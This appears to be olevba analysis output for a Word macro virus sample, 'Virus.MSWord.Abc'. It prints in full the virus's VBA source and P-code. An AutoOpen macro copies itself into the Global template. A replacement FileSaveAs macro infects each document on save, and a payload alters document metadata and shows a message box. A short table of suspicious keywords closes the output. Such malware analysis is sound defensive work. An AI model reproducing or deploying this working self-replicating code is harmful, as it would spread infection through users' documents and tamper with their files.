olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Abc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Abc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Abc - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Alice loves Bob"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim iMacroCount
Dim i
Dim bInstalled
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    'see if we're already installed
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "Colin" Then
            bInstalled = -1
        End If
    Next i
    If Not bInstalled Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":Colin"
        WordBasic.MacroCopy sMacro$, "Global:Colin"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:Bob"
        sMacro$ = sMe$ + ":Alice"
        WordBasic.MacroCopy sMacro$, "Global:Alice"
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Colin.bas 
in file: ./Virus.MSWord.Abc - OLE stream: 'Macros/VBA/Colin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Colin loves to play."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Colin.MAIN"
Dim Num
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Author:="FC"
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Title:="Smash Technology"
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Subject:="Resist Oppression"
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Keywords:=Str(WordBasic.Int(Rnd() * 100000000))
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Comments:=Str(WordBasic.Int(Rnd() * 100000000))
End If
Num = Rnd()

If Num < 0.2 Then
WordBasic.MsgBox "I am happy; are you too?", "Colin Says:", 52
End If
If Num < 0.2 Then WordBasic.Beep

End Sub
-------------------------------------------------------------------------------
VBA MACRO Alice.bas 
in file: ./Virus.MSWord.Abc - OLE stream: 'Macros/VBA/Alice'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Alice loves Bob"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Alice.MAIN"
Dim iMacroCount
Dim i
Dim bInstalled
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    'see if we're already installed
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "Colin" Then
            bInstalled = -1
        End If
    Next i
    If Not bInstalled Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":Colin"
        WordBasic.MacroCopy sMacro$, "Global:Colin"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:Bob"
        sMacro$ = sMe$ + ":Alice"
        WordBasic.MacroCopy sMacro$, "Global:Alice"
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Bob.bas 
in file: ./Virus.MSWord.Abc - OLE stream: 'Macros/VBA/Bob'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Bob loves Alice"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Bob.MAIN"
Dim sMe$
Dim sTMacro$
If Rnd() < 0.1 Then
    WordBasic.Call "Colin"
End If
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Alice", sTMacro$, 1
sTMacro$ = sMe$ + ":Alice"
WordBasic.MacroCopy "Global:Alice", sTMacro$, 1
sTMacro$ = sMe$ + ":Bob"
WordBasic.MacroCopy "Global:Bob", sTMacro$, 1
sTMacro$ = sMe$ + ":Colin"
WordBasic.MacroCopy "Global:Colin", sTMacro$, 1
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Abc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2968 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn bInstalled
' Line #5:
' 	Dim 
' 	VarDefn sMe
' Line #6:
' 	Dim 
' 	VarDefn sMacro
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #8:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #9:
' 	QuoteRem 0x0004 0x001E "see if we're already installed"
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #11:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0005 "Colin"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bInstalled 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Ld bInstalled 
' 	Not 
' 	IfBlock 
' Line #16:
' 	QuoteRem 0x0008 0x0035 "add FileSaveAs and copies of AutoOpen and FileSaveAs."
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":Colin"
' 	Add 
' 	St sMacro$ 
' Line #19:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:Colin"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":Bob"
' 	Add 
' 	St sMacro$ 
' Line #21:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":Bob"
' 	Add 
' 	St sMacro$ 
' Line #23:
' 	Ld sMacro$ 
' 	LitStr 0x000A "Global:Bob"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":Alice"
' 	Add 
' 	St sMacro$ 
' Line #25:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:Alice"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Label Abort 
' Line #28:
' 	EndSub 
' Macros/VBA/Colin - 2183 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Num
' Line #3:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #4:
' 	LitStr 0x0002 "FC"
' 	ParamNamed Author 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #7:
' 	LitStr 0x0010 "Smash Technology"
' 	ParamNamed Title 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #10:
' 	LitStr 0x0011 "Resist Oppression"
' 	ParamNamed Subject 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #13:
' 	ArgsLd Rnd 0x0000 
' 	LitDI4 0xE100 0x05F5 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	ArgsLd Str 0x0001 
' 	ParamNamed Keywords 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #16:
' 	ArgsLd Rnd 0x0000 
' 	LitDI4 0xE100 0x05F5 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	ArgsLd Str 0x0001 
' 	ParamNamed Comments 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	ArgsLd Rnd 0x0000 
' 	St Num 
' Line #19:
' Line #20:
' 	Ld Num 
' 	LitR8 0x999A 0x9999 0x9999 0x3FC9 
' 	Lt 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0018 "I am happy; are you too?"
' 	LitStr 0x000B "Colin Says:"
' 	LitDI2 0x0034 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld Num 
' 	LitR8 0x999A 0x9999 0x9999 0x3FC9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' 	EndIf 
' Line #24:
' Line #25:
' 	EndSub 
' Macros/VBA/Alice - 2470 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn bInstalled
' Line #5:
' 	Dim 
' 	VarDefn sMe
' Line #6:
' 	Dim 
' 	VarDefn sMacro
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #8:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #9:
' 	QuoteRem 0x0004 0x001E "see if we're already installed"
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #11:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0005 "Colin"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bInstalled 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Ld bInstalled 
' 	Not 
' 	IfBlock 
' Line #16:
' 	QuoteRem 0x0008 0x0035 "add FileSaveAs and copies of AutoOpen and FileSaveAs."
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":Colin"
' 	Add 
' 	St sMacro$ 
' Line #19:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:Colin"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":Bob"
' 	Add 
' 	St sMacro$ 
' Line #21:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":Bob"
' 	Add 
' 	St sMacro$ 
' Line #23:
' 	Ld sMacro$ 
' 	LitStr 0x000A "Global:Bob"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":Alice"
' 	Add 
' 	St sMacro$ 
' Line #25:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:Alice"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Label Abort 
' Line #28:
' 	EndSub 
' Macros/VBA/Bob - 2512 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Lt 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0005 "Colin"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	QuoteRem 0x0000 0x0033 "this becomes the FileSaveAs for the global template"
' Line #8:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x000C "Global:Alice"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":Alice"
' 	Add 
' 	St sTMacro$ 
' Line #17:
' 	LitStr 0x000C "Global:Alice"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0004 ":Bob"
' 	Add 
' 	St sTMacro$ 
' Line #19:
' 	LitStr 0x000A "Global:Bob"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":Colin"
' 	Add 
' 	St sTMacro$ 
' Line #21:
' 	LitStr 0x000C "Global:Colin"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #22:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' 	GoTo Done 
' Line #24:
' Line #25:
' 	Label Bail 
' Line #26:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Label Done 
' Line #30:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

